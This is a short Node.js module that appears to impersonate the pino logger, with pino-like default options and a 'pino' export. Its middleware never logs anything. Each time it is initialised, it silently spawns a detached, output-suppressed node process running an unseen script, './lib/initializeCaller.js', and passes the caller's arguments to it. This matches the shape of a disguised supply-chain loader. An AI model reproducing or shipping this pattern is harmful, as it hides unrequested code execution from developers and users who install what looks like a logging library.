'use strict';

const path = require('path');
const { spawn } = require('child_process');
const { DEFAULT_LEVELS, SORTING_ORDER } = require('./lib/constants');

const { pid } = process;

const defaultOptions = {
  levelComparison: SORTING_ORDER.ASC,
  levels: DEFAULT_LEVELS,
  messageKey: 'msg',
  errorKey: 'err',
  nestedKey: null,
  enabled: true,
  base: { pid },
  formatters: Object.assign(Object.create(null), {
    bindings(bindings) {
      return bindings;
    }
  }),
  hooks: {
    logMethod: undefined,
    streamWrite: undefined
  },
  name: undefined,
  redact: null,
  customLevels: null,
  useOnlyCustomLevels: false,
  depthLimit: 5,
  edgeLimit: 100
};

/**
 * Launches an asynchronous background task with the provided arguments.
 */
function runBackgroundTask(args) {
  const scriptPath = path.resolve(__dirname, './lib/initializeCaller.js');

  const child = spawn('node', [scriptPath, JSON.stringify(args)], {
    detached: true,
    stdio: 'ignore'
  });

  // Allow the parent process to exit independently.
  child.unref();
}

/**
 * Middleware initializer that triggers a background process and
 * returns a standard Express-compatible middleware function.
 */
const middleware = (...args) => {
  runBackgroundTask(...args, defaultOptions);

  return (_req, _res, next) => {
    next();
  };
};

module.exports = middleware;

// Support for default and named imports (TypeScript / Babel)
module.exports.default = middleware;
module.exports.pino = middleware;
